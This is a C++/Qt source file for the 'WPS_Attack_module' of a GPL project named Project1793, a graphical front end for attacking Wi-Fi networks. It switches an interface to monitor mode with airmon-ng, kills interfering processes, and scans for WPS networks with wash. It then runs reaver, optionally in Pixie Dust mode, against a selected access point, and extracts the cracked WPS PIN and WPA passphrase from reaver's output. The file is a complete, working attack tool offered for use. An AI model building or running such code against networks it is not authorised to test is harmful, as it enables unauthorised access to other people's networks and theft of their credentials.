/*
 * Copyright (c) 2016,2017 sanmira32 <matrix3sai@gmail.com>
 *
 *  This file is part of Project1793.
 *
 *  Project1793 is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Project1793 is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Project1793.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "wps_attack_module.h"

WPS_Attack_module::WPS_Attack_module(QObject *parent) : Module_1793(parent)
{

}

WPS_Attack_module::~WPS_Attack_module()
{

}

void WPS_Attack_module::start_module()
{
    QObject* moduleRootObject = WindowsManager_1793::getQmlObject("wpsAttackModule");

    connect(moduleRootObject, SIGNAL(signal_Refresh_WPS_list(QString)), this, SLOT(refresh_WPS_networks_list(QString)));

    connect(moduleRootObject, SIGNAL(signal_Refresh_interfaces_list()), this, SLOT(refresh_interfaces_list()));
    connect(moduleRootObject, SIGNAL(signal_Stop_refreshing_WPS_list()), this, SLOT(stop_refreshing_WPS_list()));

    connect(moduleRootObject, SIGNAL(signal_Start_WPS_attack(QString, QString, QString, int)), this, SLOT(WPS_attack(QString, QString, QString, int)));
    connect(moduleRootObject, SIGNAL(signal_Stop_WPS_attack()), this, SLOT(stop_WPS_attack()));

    connect(this, SIGNAL(add_new_WPS_network(Network)), modelData, SLOT(add_new_network(Network)));
    connect(this, SIGNAL(add_new_interface(QString)), modelData, SLOT(add_new_interface(QString)));

    connect(this, SIGNAL(clear_WPS_list_model()), modelData, SLOT(clear_WPS_networks_list()));
    connect(this, SIGNAL(clear_interfaces_list_model()), modelData, SLOT(clear_interfaces_list()));



    refresh_interfaces_list();
    qDebug() << "WPS_Attack_module started";
}

void WPS_Attack_module::terminate_module()
{
    if (!switchInterfaceToMonitor.isNull())
    {
        if (switchInterfaceToMonitor->state() == QProcess::Running)
        {
            disconnect(switchInterfaceToMonitor, SIGNAL(readyRead()), this, SLOT(handle_switch_interface_to_monitor_data()));
            disconnect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(start_checking_apps_tokill()));
            switchInterfaceToMonitor->terminate();
            switchInterfaceToMonitor->waitForFinished();
        }
        delete (switchInterfaceToMonitor);
    }

    if (!switchInterfaceToStation.isNull())
    {
        if (switchInterfaceToStation->state() == QProcess::Running)
        {
            disconnect(switchInterfaceToStation, SIGNAL(readyRead()), this, SLOT(handle_switch_interface_to_station_data()));
            disconnect(switchInterfaceToStation, SIGNAL(finished(int)), this, SLOT(stop_switching_interface_to_station()));
            switchInterfaceToStation->terminate();
            switchInterfaceToStation->waitForFinished();
        }
        delete (switchInterfaceToStation);
    }

    if (!checkAppsToKill.isNull())
    {
        if (checkAppsToKill->state() == QProcess::Running)
        {
            disconnect(checkAppsToKill, SIGNAL(readyRead()), this, SLOT(handle_checking_apps_tokill_data()));
            disconnect(checkAppsToKill, SIGNAL(finished(int)), this, SLOT(start_putting_interface_down()));
            checkAppsToKill->terminate();
            checkAppsToKill->waitForFinished();
        }
        delete (checkAppsToKill);
    }

    if (!puttingInterfaceDown.isNull())
    {
        if (puttingInterfaceDown->state() == QProcess::Running)
        {
            disconnect(puttingInterfaceDown, SIGNAL(finished(int)), this, SLOT(start_putting_interface_up()));
            puttingInterfaceDown->terminate();
            puttingInterfaceDown->waitForFinished();
        }
        delete (puttingInterfaceDown);
    }

    if (!puttingInterfaceUp.isNull())
    {
        if (puttingInterfaceUp->state() == QProcess::Running)
        {
            if (currentInterfaceMode == flag_interface_WPS_refreshing)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_refreshing_WPS_list()));
            else if (currentInterfaceMode == flag_interface_WPS_attack)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_WPS_attack()));
            else
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(switch_interface_to_station()));
            puttingInterfaceUp->terminate();
            puttingInterfaceUp->waitForFinished();
        }
        delete (puttingInterfaceUp);
    }

    if (!startWPSAttack.isNull())
    {
        if (startWPSAttack->state() == QProcess::Running)
        {
            qDebug() << "WPS_attack interrupted";
            disconnect(startWPSAttack, SIGNAL(readyRead()), this, SLOT(handle_WPS_attack_data()));
            disconnect(startWPSAttack, SIGNAL(started()), this, SLOT(WPS_send_confirm()));
            disconnect(startWPSAttack, SIGNAL(finished(int)), this, SLOT(complete_WPS_attack()));
            startWPSAttack->terminate();
            startWPSAttack->waitForFinished();
            delete (startWPSAttack);
        }
    }

    if (!loadWPSLits.isNull())
    {
        if (loadWPSLits->state() == QProcess::Running)
        {
            qDebug() << "WPS list refreshing interrupted";
            disconnect(loadWPSLits, SIGNAL(readyRead()), this, SLOT(handle_refreshing_WPS_data()));
            loadWPSLits->terminate();
            loadWPSLits->waitForFinished();
            delete (loadWPSLits);
        }
    }

    loadInterfacesList = new QProcess;
    loadInterfacesList->start("iw dev");
    loadInterfacesList->waitForStarted(1000);
    loadInterfacesList->waitForReadyRead(1000);
    QByteArray data;
    data.append(loadInterfacesList->readAll());
    QRegularExpression interfaceName("(?<=Interface(\\s))(\\w+)");

    QRegularExpressionMatchIterator i = interfaceName.globalMatch(QVariant(data).toString());
    while (i.hasNext())
    {
        QRegularExpressionMatch captureInterfaceName = i.next();
        if (captureInterfaceName.hasMatch())
        {
            if (captureInterfaceName.captured(0).contains("mon"))
            {
                qDebug() << "Interfaces list contains monitor interface. Switching it to station...";
                switchInterfaceToStation = new QProcess;
                switchInterfaceToStation->start("airmon-ng stop " + captureInterfaceName.captured(0));
                switchInterfaceToStation->waitForFinished();
                delete (switchInterfaceToStation);
            }
        }
    }
    loadInterfacesList->waitForFinished();
    delete (loadInterfacesList);

    qDebug() << "WPS_Attack termination";
}

void WPS_Attack_module::refresh_interfaces_list()
{
    emit clear_interfaces_list_model();
    loadInterfacesList = new QProcess;
    connect(loadInterfacesList, SIGNAL(readyRead()), this, SLOT(handle_interfaces_info()));
    connect(loadInterfacesList, SIGNAL(finished(int)), this, SLOT(stop_refreshing_interfaces_list()));
    loadInterfacesList->start("iw dev");
}

void WPS_Attack_module::handle_interfaces_info()
{
    QByteArray data;
    data.append(loadInterfacesList->readAll());
    append_new_message_to_std(QVariant(data));

    QRegularExpression interfaceName("(?<=Interface(\\s))(\\w+)");

    QRegularExpressionMatchIterator i = interfaceName.globalMatch(QVariant(data).toString());
    while (i.hasNext())
    {
        QRegularExpressionMatch captureInterfaceName = i.next();
        if (captureInterfaceName.hasMatch())
        {
            emit add_new_interface(captureInterfaceName.captured(0));
        }
    }
}

void WPS_Attack_module::stop_refreshing_interfaces_list()
{
    loadInterfacesList->deleteLater();
}

void WPS_Attack_module::refresh_WPS_networks_list(const QString& interface)
{
    if (interface.isEmpty())
    {
        append_new_message_to_std(QVariant("Please select your wireless interface"));
        complete_routine();
        return;
    }
    emit clear_WPS_list_model();
    currentInterfaceMode = flag_interface_WPS_refreshing;
    start_working_with_interface(interface);
}

void WPS_Attack_module::start_working_with_interface(const QString& interface)
{
    monitorInterface = "";
    switchInterfaceToMonitor = new QProcess;
    connect(switchInterfaceToMonitor, SIGNAL(readyRead()), this, SLOT(handle_switch_interface_to_monitor_data()));
    connect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(start_checking_apps_tokill()));
    switchInterfaceToMonitor->start("airmon-ng start " + interface);
}

void WPS_Attack_module::handle_switch_interface_to_monitor_data()
{
    QByteArray data;
    data.append(switchInterfaceToMonitor->readAll());
    append_new_message_to_std(QVariant(data));

    QRegularExpression monitorInterfaceName("(\\w*[\\d]mon\\w*)|(\\w*mon[\\d]\\w*)");

    QRegularExpressionMatch captureIntName = monitorInterfaceName.match(QVariant(data).toString());

    if (captureIntName.hasMatch())
    {
        monitorInterface = captureIntName.captured(0);
    }
}

void WPS_Attack_module::stop_switching_interface_to_monitor()
{
    switchInterfaceToMonitor->deleteLater();
    switch_interface_to_station();
}

void WPS_Attack_module::start_checking_apps_tokill()
{
    switchInterfaceToMonitor->deleteLater();
    checkAppsToKill = new QProcess;
    connect(checkAppsToKill, SIGNAL(readyRead()), this, SLOT(handle_checking_apps_tokill_data()));
    connect(checkAppsToKill, SIGNAL(finished(int)), this, SLOT(start_putting_interface_down()));
    checkAppsToKill->start("airmon-ng check kill");
}

void WPS_Attack_module::handle_checking_apps_tokill_data()
{
    QByteArray data;
    data.append(checkAppsToKill->readAll());
    append_new_message_to_std(QVariant(data));
}

void WPS_Attack_module::start_putting_interface_down()
{
    checkAppsToKill->deleteLater();
    puttingInterfaceDown = new QProcess;
    connect(puttingInterfaceDown, SIGNAL(finished(int)), this, SLOT(start_putting_interface_up()));
    puttingInterfaceDown->start("ifconfig " + monitorInterface + " down");
}

void WPS_Attack_module::start_putting_interface_up()
{
    puttingInterfaceDown->deleteLater();
    puttingInterfaceUp = new QProcess;
    if (currentInterfaceMode == flag_interface_WPS_refreshing)
        connect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_refreshing_WPS_list()));
    else if (currentInterfaceMode == flag_interface_WPS_attack)
        connect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_WPS_attack()));
    else
        connect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(switch_interface_to_station()));
    puttingInterfaceUp->start("ifconfig " + monitorInterface + " up");
}

void WPS_Attack_module::start_refreshing_WPS_list()
{
    puttingInterfaceUp->deleteLater();
    loadWPSLits = new QProcess(this);
    connect(loadWPSLits, SIGNAL(readyRead()), this, SLOT(handle_refreshing_WPS_data()));
    loadWPSLits->start("wash -i " + monitorInterface);
}

void WPS_Attack_module::handle_refreshing_WPS_data()
{
    QByteArray data;
    data = loadWPSLits->readAll();
    append_new_message_to_std(QVariant(data).toString());
    QString essid, bssid;
    QRegularExpression bssidExp("\\S\\S:\\S\\S:\\S\\S:\\S\\S:\\S\\S:\\S\\S");
    QRegularExpressionMatch captureBssid = bssidExp.match(QVariant(data).toString());
    if (captureBssid.hasMatch())
    {
        bssid = captureBssid.captured(0);
        QRegularExpression essidExp("\\S+?\\s?\\S+?\\s?\\S+$");
        QRegularExpressionMatch captureEssid = essidExp.match(QVariant(data).toString());
        if (captureEssid.hasMatch())
        {
            essid = captureEssid.captured(0);
            add_new_WPS_network(Network(essid,bssid));
        }
    }
}

void WPS_Attack_module::switch_interface_to_station()
{
    if (monitorInterface.isEmpty())
    {
        qDebug() << "Cannot find monitor interface";
        return;
    }

    switchInterfaceToStation = new QProcess;
    connect(switchInterfaceToStation, SIGNAL(readyRead()), this, SLOT(handle_switch_interface_to_station_data()));
    connect(switchInterfaceToStation, SIGNAL(finished(int)), this, SLOT(stop_switching_interface_to_station()));
    switchInterfaceToStation->start("airmon-ng stop " + monitorInterface);
}

void WPS_Attack_module::handle_switch_interface_to_station_data()
{
    QByteArray data;
    data.append(switchInterfaceToStation->readAll());
    append_new_message_to_std(QVariant(data));
}

void WPS_Attack_module::stop_switching_interface_to_station()
{
    switchInterfaceToStation->deleteLater();
    currentInterfaceMode = flag_interface_not_handling;
    monitorInterface = "";
    complete_routine();
}

void WPS_Attack_module::stop_refreshing_WPS_list()
{
    if (!switchInterfaceToMonitor.isNull())
    {
        if (switchInterfaceToMonitor->state() == QProcess::Running)
        {
            disconnect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(start_checking_apps_tokill()));
            connect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(stop_switching_interface_to_monitor()));
        }
    } else

    if (!checkAppsToKill.isNull())
    {
        if (checkAppsToKill->state() == QProcess::Running)
        {
            disconnect(checkAppsToKill, SIGNAL(readyRead()), this, SLOT(handle_checking_apps_tokill_data()));
            disconnect(checkAppsToKill, SIGNAL(finished(int)), this, SLOT(start_putting_interface_down()));
            checkAppsToKill->terminate();
            checkAppsToKill->waitForFinished();
        }
        checkAppsToKill->deleteLater();
        switch_interface_to_station();
    } else

    if (!puttingInterfaceDown.isNull())
    {
        if (puttingInterfaceDown->state() == QProcess::Running)
        {
            disconnect(puttingInterfaceDown, SIGNAL(finished(int)), this, SLOT(start_putting_interface_up()));
            puttingInterfaceDown->terminate();
            puttingInterfaceDown->waitForFinished();
        }
        puttingInterfaceDown->deleteLater();
        switch_interface_to_station();
    } else

    if (!puttingInterfaceUp.isNull())
    {
        if (puttingInterfaceUp->state() == QProcess::Running)
        {
            if (currentInterfaceMode == flag_interface_WPS_refreshing)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_refreshing_WPS_list()));
            else if (currentInterfaceMode == flag_interface_WPS_attack)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_WPS_attack()));
            else
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(switch_interface_to_station()));
            puttingInterfaceUp->terminate();
            puttingInterfaceUp->waitForFinished();
        }
        puttingInterfaceUp->deleteLater();
        switch_interface_to_station();
    } else

    if (!loadWPSLits.isNull())
    {
        if (loadWPSLits->state() == QProcess::Running)
        {
            append_new_message_to_std(QVariant("WPS list updated"));
            disconnect(loadWPSLits, SIGNAL(readyRead()), this, SLOT(handle_refreshing_WPS_data()));
            loadWPSLits->terminate();
            loadWPSLits->waitForFinished();
            loadWPSLits->deleteLater();
            switch_interface_to_station();
        }
    } else
    {
        complete_routine();
    }
}

void WPS_Attack_module::complete_routine()
{
    QObject* moduleRootObject = WindowsManager_1793::getQmlObject("wpsAttackModule");
    QMetaObject::invokeMethod(moduleRootObject, "show_all");
}

void WPS_Attack_module::WPS_attack(const QString &interface, const QString &essid, const QString &bssid, const int pixie)
{
    if (bssid.isEmpty())
    {
        append_new_message_to_std(QVariant("Please refresh networks list and select network you want to attack"));
        complete_routine();
        return;
    }
    name = essid;
    mac = bssid;
    pixieState = pixie;
    currentInterfaceMode = flag_interface_WPS_attack;
    start_working_with_interface(interface);
}

void WPS_Attack_module::start_WPS_attack()
{
    puttingInterfaceUp->deleteLater();
    startWPSAttack = new QProcess(this);
    connect(startWPSAttack, SIGNAL(readyRead()), this, SLOT(handle_WPS_attack_data()));
    connect(startWPSAttack, SIGNAL(started()), this, SLOT(WPS_send_confirm()));
    connect(startWPSAttack, SIGNAL(finished(int)), this, SLOT(complete_WPS_attack()));
    if (pixieState == 0)
        startWPSAttack->start("reaver -i " + monitorInterface + " -b " + mac + " -vv", QProcess::ReadWrite);
    else if (pixieState == 1)
        startWPSAttack->start("reaver -i " + monitorInterface + " -b " + mac + " -K 1 -vv", QProcess::ReadWrite);
}

void WPS_Attack_module::handle_WPS_attack_data()
{
    QByteArray data;
    data.append(startWPSAttack->readAll());
    append_new_message_to_std(QVariant(data));
    QString resultAttackData;
    bool pskCheckStatus = false;
    QRegularExpression wpspinExp("WPS\\sPIN:\\s\\S+");
    QRegularExpressionMatch wpspinCap = wpspinExp.match(QVariant(data).toString());
    if (wpspinCap.hasMatch())
    {
        pskCheckStatus = true;
        resultAttackData.append("New cracked info:\n");
        resultAttackData.append(wpspinCap.captured(0));
        resultAttackData.append("\n");
        QRegularExpression wpapskExp("WPA\\sPSK:\\s\\S+");
        QRegularExpressionMatch wpapskCap = wpapskExp.match(QVariant(data).toString());
        if (wpapskCap.hasMatch())
        {
            resultAttackData.append(wpapskCap.captured(0));
            resultAttackData.append("\n");
            QRegularExpression essidExp("AP\\sSSID:\\s\\S+");
            QRegularExpressionMatch essidCap = essidExp.match(QVariant(data).toString());
            if (essidCap.hasMatch())
            {
                resultAttackData.append(essidCap.captured(0));
                resultAttackData.append("\n\n");
            }
        }
    }
    if (pskCheckStatus)
    {
        WindowsManager_1793::show_notification_info(resultAttackData);
    }
}

void WPS_Attack_module::WPS_send_confirm()
{
    startWPSAttack->write("Y");
}

void WPS_Attack_module::complete_WPS_attack()
{
    switch_interface_to_station();
    complete_routine();
}

void WPS_Attack_module::stop_WPS_attack()
{
    if (!switchInterfaceToMonitor.isNull())
    {
        if (switchInterfaceToMonitor->state() == QProcess::Running)
        {
            disconnect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(start_checking_apps_tokill()));
            connect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(stop_switching_interface_to_monitor()));
        }
    } else

    if (!checkAppsToKill.isNull())
    {
        if (checkAppsToKill->state() == QProcess::Running)
        {
            disconnect(checkAppsToKill, SIGNAL(readyRead()), this, SLOT(handle_checking_apps_tokill_data()));
            disconnect(checkAppsToKill, SIGNAL(finished(int)), this, SLOT(start_putting_interface_down()));
            checkAppsToKill->terminate();
            checkAppsToKill->waitForFinished();
            switch_interface_to_station();
        }
        checkAppsToKill->deleteLater();
    } else

    if (!puttingInterfaceDown.isNull())
    {
        if (puttingInterfaceDown->state() == QProcess::Running)
        {
            disconnect(puttingInterfaceDown, SIGNAL(finished(int)), this, SLOT(start_putting_interface_up()));
            puttingInterfaceDown->terminate();
            puttingInterfaceDown->waitForFinished();
            switch_interface_to_station();
        }
        puttingInterfaceDown->deleteLater();
    } else

    if (!puttingInterfaceUp.isNull())
    {
        if (puttingInterfaceUp->state() == QProcess::Running)
        {
            if (currentInterfaceMode == flag_interface_WPS_refreshing)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_refreshing_WPS_list()));
            else if (currentInterfaceMode == flag_interface_WPS_attack)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_WPS_attack()));
            else
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(switch_interface_to_station()));
            puttingInterfaceUp->terminate();
            puttingInterfaceUp->waitForFinished();
            switch_interface_to_station();
        }
        puttingInterfaceUp->deleteLater();
    } else

    if (!startWPSAttack.isNull())
    {
        if (startWPSAttack->state() == QProcess::Running)
        {
            append_new_message_to_std(QVariant("WPS_attack interrupted"));
            disconnect(startWPSAttack, SIGNAL(readyRead()), this, SLOT(handle_WPS_attack_data()));
            disconnect(startWPSAttack, SIGNAL(started()), this, SLOT(WPS_send_confirm()));
            disconnect(startWPSAttack, SIGNAL(finished(int)), this, SLOT(complete_WPS_attack()));
            startWPSAttack->terminate();
            startWPSAttack->waitForFinished();
            startWPSAttack->deleteLater();
            switch_interface_to_station();
        }
    } else
    {
        complete_routine();
    }
}

void WPS_Attack_module::append_new_message_to_std(const QVariant& data)
{
    //WindowsManager_1793::show_notification_warning("Test"); -> it causes crash :(
    QObject* moduleRootObject = WindowsManager_1793::getQmlObject("wpsAttackModule");
    QMetaObject::invokeMethod(moduleRootObject, "append_stdout_text",
                              Q_ARG(QVariant, data));
}
